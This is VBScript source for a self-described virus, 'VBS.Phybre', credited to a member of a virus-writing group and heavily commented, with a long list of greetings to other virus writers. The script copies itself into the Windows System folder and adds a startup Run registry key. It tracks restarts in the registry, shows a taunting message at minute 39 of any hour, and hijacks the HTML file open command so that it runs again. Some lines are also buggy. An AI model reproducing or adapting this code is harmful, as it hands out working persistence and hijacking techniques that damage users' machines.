' VBS.Phybre
' Coded by Ruzz`
' The Shadow Virus Group
' http://www.shadowvx.org/
'
'----- Basic Description
'
' Creates self into %WINDOWS%\System dir
' Edits Registry to make run at startup
'
'----- Payload
'
' Displays message on screen if the code is run at 39 minutes past any hour
' Edits the Registry so the code is run when an HTML file is clicked
'
'-----Greetz
'---People
'
' Kamaileon, Bhunji, VxFaeRie, AcidFlux, Zer0-, ^wrm^, Vrinidad, b0w2dac0w,
' darkman, Spyda, Roadkil, Evul, PaX, MidNyte, Raid, SPo0ky, opic, Rapture,
' Gigabyte, Knowdeth, Foxz, Morphine, PhreakX, Rhape79, VirusBuster, |Serial|,
' f0re, Silence, Secret, Tally, The_Might, CyberYoda, Flitnic, GriYo, jtr, 
' Mandragore, nUcLeii, Rajaat, Vecna, Mister Sandman, Evil-E, Bumblebee, 
' Acidbytes, Slagehammer, Lord Arz, JFK, TPhunk, BSL4, veedee, Zulu, MetGod,
' jackie-, HomeS|ice, DX100h, `Cobra, `DS, TheHex, Darkness5, `heather`, Nala,
' Del_Armg0, mort, plush, Simon7, Cyclone00, Uneek, Yesnah, Perikles, G-Nome,
' Denice, Phage, LiFEwiRE, xHeCs, Beuno, VaMpIrEsS, NathanY, Kassy-Kas, EXE-Gency,
' CS, HeLLlinkER, LysKovick, MetalKid, XaRaBaS, genux, X, W..... 
'
'---Groups
' The Shadow Virus Group, Ultimate Chaos Security International, 29a, Codebreakers,
' 29a, MATRiX, SLAM, No Mercy Virus Team, LineZer0, Metaphase, HFX, Datacore, HNC
'
'---Wildcards
' *.* in
' #shadowvx, #virus, #vir, #vx-vtc, #vxtrader, #vx, #hfx, #whhs, #datacore
' And anyone else I have come into contact with via email, IRC, ICQ, whatever 
' since I joined the scene
'
' I'm gonna stop now, before there are more greetz than lines of code... :)
' ( which I think has already happened  :P )

' Begin code
On Error Resume Next  ' -[ If there is an error, continue
Set fso = CreateObject("Scripting.FileSystemObject")  ' -[ Define fso to allow creation and editing of files
Set reg = CreateObject("WScript.Shell")  ' -[ Define reg to allow Registry editing
Const SystemFolder = 1, ForReading = 1, ForWriting = 2, ForAppending = 8  ' -[ Make numbers more meaningful

Dim Parent, ReadIt, Destination, Mirror, FileInfo, Check, Loaded  ' -[ Set variables used
Parent = WScript.ScriptFullName  ' -[ Get the full path and filename of the script
Set Destination = fso.GetSpecialFolder(SystemFolder)  ' -[ Make Destination = %WINDOWS%\System
FileInfo = Destination & "\VBS.Phybre.vbs"  ' -[ Append the file name to Destination (%WINDOWS%\System\VBS.Phybre.vbs)
If (fso.FileExists(FileInfo)) Then  ' -[ Check to see if the file already exists.  If it does
Set Check = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre")  ' -[ Check to see if the code is run at startup by reading from the Registry
If Check = FileInfo Then  ' -[ If code is present in the run list then end the IF loop
Else
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre", FileInfo  ' -[ Else, edit the registry to make the code run at startup
End If  ' -[ End the IF loop

Else
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs", "1"  ' -[ If the file does not exist then create a Registry entry to show amount of runs
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Notifies", "0"  ' -[ Create a Registry entry to show the amount of times the code has notified the user
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Phybre", FileInfo  ' -[ Create a Registry entry to make sure the code is run at startup
Set ReadMe = fso.OpenTextFile(Parent, ForReading)  ' -[ Open the code for reading
ReadIt = ReadMe.ReadAll  ' -[ Read all the code
ReadMe.Close  ' -[ Close the code file
Set Mirror = fso.CreateTextFile(FileInfo, True)  ' -[ Create a textfile in %WINDOWS%\System called VBS.Phybre.vbs
Mirror.Write ReadIt  ' -[ Write the previously read code to it
Mirror.Close  ' -[ Close the file
End If

Mins = Minute(Now)  ' -[ Get the minute count from the current time

If Mins = "39" Then  ' -[ If the returned value is "39" then
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs")  ' -[ Read the amount of runs from the Registry
Notifies = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Notifies")  ' -[ Read the amount of notifies from the Registry
MsgBox "Tick Tick... " & (Chr(13) & Chr(10)) & "I Have Sat On Your System For " & Loaded & " Restarts Before Making Myself Known To You. I Have Notified You " & Notifies & "Time(s) Before" & (Chr(13) & Chr(10)) & (Chr(13) & Chr(10)) & "VBS.Phybre"  & (Chr(13) & Chr(10)) & "Coded by Ruzz`" & (Chr(13) & Chr(10)) & "The Shadow Virus Group" & (Chr(13) & Chr(10)) & "http://www.shadowvx.org", 4096, "VBS.Phybre"  ' -[ Display a message box on the screen that stays on top of all applications that shows the amount of runs, notifies and the coder, group and URL
Reg.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\(Default)", "c:\windows\system\Phybre.vbs"  ' -[ Edit a Registry entry so that when an HTML file is clicked, the code is run again
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs", "0"  ' -[ Reset the amount of runs to 0
Notifies = Notifies + 1  ' -[ Increase the amount of notifies by 1
Reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Notifies", "Notifies"  ' -[ Re-write the amount of notifies to the Registry
Else
Loaded = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs")  ' -[ If the minutes returned does not equal 39
Loaded = Loaded + 1  ' -[ Increase the amount of runs by 1
Reg.RegWrite "HKEY_LOCAL_MACHICE\Software\Microsoft\Windows\CurrentVersion\Phybre\Runs", Loaded  ' -[ Re-write the amount of runs to the Registry
End If
' End Code